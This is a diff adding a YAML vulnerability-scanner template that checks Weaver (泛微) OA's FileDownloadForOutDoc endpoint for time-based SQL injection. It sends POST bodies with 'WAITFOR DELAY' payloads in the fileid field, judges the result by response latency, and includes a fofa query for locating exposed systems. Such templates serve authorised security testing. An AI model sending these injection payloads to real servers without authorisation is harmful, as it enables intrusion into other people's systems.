@@ -1,0 +1,44 @@
+id: ecology-filedownloadforoutdoc-sqli
+
+info:
+  name: 泛微 OA filedownloadforoutdoc - SQL injection
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    泛微 OA filedownloadforoutdoc interface has SQL injection
+    fofa: app="泛微-协同办公OA"
+  tags: ecology,sqli
+  created: 2023/07/11
+
+set:
+  rand0: randomInt(100,199)
+  rand1: randomInt(200,299)
+  rand2: randomInt(300,399)
+  rand3: randomInt(400,499)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /weaver/weaver.file.FileDownloadForOutDoc
+      body: isFromOutImg=1&fileid={{rand0}}+WAITFOR+DELAY+'0:0:10'
+    expression: response.status == 200 && response.latency <= 12000 &&  response.latency >= 10000
+  r1:
+    request:
+      method: POST
+      path: /weaver/weaver.file.FileDownloadForOutDoc
+      body: isFromOutImg=1&fileid={{rand1}}+WAITFOR+DELAY+'0:0:6'
+    expression: response.status == 200 && response.latency <= 8000 &&  response.latency >= 6000
+  r2:
+    request:
+      method: POST
+      path: /weaver/weaver.file.FileDownloadForOutDoc
+      body: isFromOutImg=1&fileid={{rand2}}+WAITFOR+DELAY+'0:0:10'
+    expression: response.status == 200 && response.latency <= 12000 &&  response.latency >= 10000
+  r3:
+    request:
+      method: POST
+      path: /weaver/weaver.file.FileDownloadForOutDoc
+      body: isFromOutImg=1&fileid={{rand1}}+WAITFOR+DELAY+'0:0:6'
+    expression: response.status == 200 && response.latency <= 8000 &&  response.latency >= 6000
+expression: r0() && r1() && r2() && r3()
